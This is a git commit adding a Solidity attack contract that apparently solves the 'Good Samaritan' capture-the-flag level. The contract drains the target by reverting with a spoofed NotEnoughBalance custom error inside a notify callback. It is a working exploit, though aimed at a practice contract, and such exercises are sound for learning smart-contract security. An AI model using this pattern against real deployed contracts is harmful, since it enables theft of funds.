db094106d259995caf7b522940170219aae3488b
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-26 10:37:11 +0800

    Update Attack.sol

--- 27. Good Samaritan ★★★☆☆/Attack.sol
+++ 27. Good Samaritan ★★★☆☆/Attack.sol
@@ -1,1 +1,27 @@
+// SPDX-License-Identifier: MIM
 
+pragma solidity ^0.8.0;
+
+interface IGoodSamaritan {
+    function requestDonation() external returns (bool enoughBalance);
+}
+
+contract Attack {
+    error NotEnoughBalance();
+
+    IGoodSamaritan target;
+
+    constructor(address targetAddr) {
+        target = IGoodSamaritan(targetAddr);
+    }
+
+    function attack() public {
+        target.requestDonation();
+    }
+
+    function notify(uint256 amount) external pure {
+        if (amount <= 10) {
+            revert NotEnoughBalance();
+        }
+    }
+}
